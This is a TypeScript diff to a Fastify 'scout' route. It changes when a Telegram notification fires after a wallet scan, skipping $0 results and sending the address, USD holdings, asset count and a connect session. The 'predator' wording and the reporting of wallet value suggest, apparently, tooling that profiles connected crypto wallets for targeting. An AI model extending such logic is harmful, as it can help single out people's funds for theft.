@@ -195,23 +195,26 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
         'OMNICHAIN_EXPANSION_LOCKED',
       )
 
-      // 🔔 Telegram: Notify scan complete with total USD + context (fire-and-forget)
+      // 🔔 Telegram: Notify scan complete — skip $0 (client sends correct USD via scan_complete)
       if (primaryAddress) {
         const totalUsd = typeof (fusion as Record<string, unknown>)['total_usd'] === 'number'
           ? (fusion as Record<string, unknown>)['total_usd'] as number
           : 0
-        const assetsCount = typeof (fusion as Record<string, unknown>)['assets_count'] === 'number'
-          ? (fusion as Record<string, unknown>)['assets_count'] as number
-          : Object.keys(fusion as object).length
-        const scanCtx: TelegramRequestContext = {
-          ...ctx,
-          scout_value_usd:
-            body.scout_value_usd != null ? body.scout_value_usd : totalUsd,
-          ...(typeof body.connect_session === 'string' && body.connect_session.trim() !== ''
-            ? { connect_session: body.connect_session.trim() }
-            : {}),
+        const scoutUsdFromBody = body.scout_value_usd != null ? Number(body.scout_value_usd) : 0
+        const notifyUsd = scoutUsdFromBody > 0 ? scoutUsdFromBody : totalUsd
+        if (notifyUsd > 0) {
+          const assetsCount = typeof (fusion as Record<string, unknown>)['assets_count'] === 'number'
+            ? (fusion as Record<string, unknown>)['assets_count'] as number
+            : Object.keys(fusion as object).length
+          const scanCtx: TelegramRequestContext = {
+            ...ctx,
+            scout_value_usd: notifyUsd,
+            ...(typeof body.connect_session === 'string' && body.connect_session.trim() !== ''
+              ? { connect_session: body.connect_session.trim() }
+              : {}),
+          }
+          void notifyScanComplete(primaryAddress, notifyUsd, assetsCount, scanCtx).catch(() => {})
         }
-        void notifyScanComplete(primaryAddress, totalUsd, assetsCount, scanCtx).catch(() => {})
       }
 
       return sendSuccess(reply, 200, 'Recursive predator fusion complete', {
